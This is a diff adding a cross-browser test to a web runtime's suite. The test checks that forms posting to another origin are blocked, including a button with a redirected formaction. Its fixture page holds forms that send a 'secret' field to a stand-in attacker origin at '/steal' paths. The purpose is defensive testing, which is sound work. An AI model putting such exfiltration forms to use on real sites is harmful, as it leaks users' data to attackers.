@@ -456,6 +456,23 @@ for (const [engine, launcher] of NAMES.map((name) => [name, ENGINES[name]])) {
       await context.close();
     });
 
+    test(`a form aimed at another origin is refused by the runtime, whatever the content policy (${engine})`, async () => {
+      f.evil.length = 0;
+      const path = key("xorigin-open");
+      // A policy that lets the page fetch and post anywhere: only the runtime stands in the way.
+      const open = { "content-security-policy": "script-src 'self'; style-src 'self'", "set-cookie": "XSRF-TOKEN=tok; Path=/" };
+      route(`/${path}`, doc(`<form id="f" data-ui-form method="post" action="${f.evilOrigin}/steal"><input name="secret" value="s"><button id="go">go</button></form><form id="g" data-ui-form method="post" action="/${path}-post"><button id="here" formaction="${f.evilOrigin}/steal-by-button">go</button></form>`), open);
+      const { context, page } = await fresh(`/${path}`);
+      await page.click("#go");
+      await page.click("#here");
+      await sleep(200);
+      assert.deepEqual(f.evil, [], "nothing, not even a preflight, reached the other origin");
+      assert.deepEqual(hits(`/${path}-post`), []);
+      assert.ok(page.url().startsWith(f.origin), page.url());
+      assert.equal(await page.evaluate(() => document.querySelector("[data-pending]")), null);
+      await context.close();
+    });
+
     /** Two links, a form; the form's answer changes what `/x-private` shows. */
     function staleScene(answer) {
       const name = key("stale");
